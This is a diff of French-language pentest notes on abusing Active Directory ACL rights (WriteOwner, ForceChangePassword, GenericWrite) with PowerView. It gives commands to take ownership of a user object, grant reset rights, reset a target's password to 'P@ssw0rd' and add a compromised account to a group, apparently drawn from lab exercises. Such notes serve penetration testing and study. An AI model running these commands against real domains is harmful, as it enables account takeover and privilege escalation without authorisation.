@@ -18,32 +18,28 @@ Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $si
 
 ### WriteOwner (appropriation d'un objet)
 
-Permet de s'approprier un objet pour ensuite accéder à ses propriétés en lecture / modification
+Permet de s'approprier un objet pour ensuite accéder à ses propriétés et ajouter d'autres ACLs (par exemple l'ajout du droit ForceChangePassword)
 
-
-### ForceChangePassword (modification du mot de passe)
-```powershell title="Réinitialisation du mot de passe AD via appropriation de l'objet utilisateur cible"
-
+```powershell
 # Appropriation d'un utilisateur (lorsqu'on a un droit WriteOwner référencé dans Bloodhound)
-Set-DomainObjectOwner -Identity $targetUser -OwnerIdentity source_user
+Set-DomainObjectOwner -Identity $targetUser -OwnerIdentity $compromisedUser
 # Ajout d'une ACL sur le compte approprié pour réinitialiser le password :
 Add-DomainObjectAcl -TargetIdentity $targetUser -PrincipalIdentity source_user -Rights ResetPassword
+```
 
+### ForceChangePassword (modification du mot de passe)
+```powershell
 # Réinitialisation du password
 $pass = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
 Set-DomainUserPassword -Identity Target_AD_User -Password $pass
 ```
 
+### GenericWrite 
+Permet :
+- l'ajout d'un utitilisateur comme membre d'un groupe sur le quel on dispose de ce droit
+
 ```powershell
-
-#########################################################
-# Add compromised user to Group
-# requirement : need GenericWrite right on the targetted group
-$clearPass = "P@ssw0rd"
-$user = "INLANEFREIGHT\userWithGenericAllRight"
-$cred_damundsen = New-Object System.Management.Automation.PSCredential($user, (ConvertTo-SecureString $clearPass -AsPlainText -Force))
-
-Add-DomainGroupMember -Identity "Help Desk Level 1" -Members wley -Credential $cred_damundsen
+Add-DomainGroupMember -Identity "Target Group With GenericWrite right" -Members compromised
 # Verification
 Get-DomainGroupMember -Identity "Help Desk Level 1" | ?{$_.MemberName -eq 'wley'}
 
